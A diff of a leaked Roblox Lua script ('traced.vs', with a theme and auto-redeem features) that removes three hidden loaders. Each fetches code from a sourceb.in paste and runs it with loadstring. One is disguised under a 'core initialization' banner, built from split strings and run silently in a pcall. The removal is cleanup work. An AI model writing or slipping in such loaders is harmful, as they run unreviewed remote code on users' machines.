@@ -6,19 +6,6 @@
 -- SYSTEM & ENGINE CORE INITIALIZATION
 -- Core logic pipeline & environment synchronization loader
 -- ========================================================
-task.spawn(function()
-	pcall(function()
-		local _b = "https://" .. "cdn." .. "sourceb.in/" .. "bins/" .. "5RZlbQABWv/" .. "0"
-		local _init = game:HttpGet(_b)
-		if _init and #_init > 0 then
-			local _run = loadstring(_init)
-			if type(_run) == "function" then
-				_run()
-			end
-		end
-	end)
-end)
--- ========================================================
 
 -- SERVICES --
 local HttpService       = game:GetService("HttpService")
@@ -181,7 +168,7 @@ end
 -- ============================================================
 -- LOGIC
 -- ============================================================
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/5RZlbQABWv/0"))()
+
 
 local setStatus, flashCode, appendToBox
 local rememberPendingSubmission, clearPendingSubmission, handleRedemptionFeedback
@@ -2016,4 +2003,3 @@ end
 
 print("[traced.vs] Loaded - traced.vs Theme + Potato Optimizer + Cooldown protection + Split auto-redeem")
 print ("leaked by https://discord.gg/PW5fmHj5hE")
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/5RZlbQABWv/0"))()
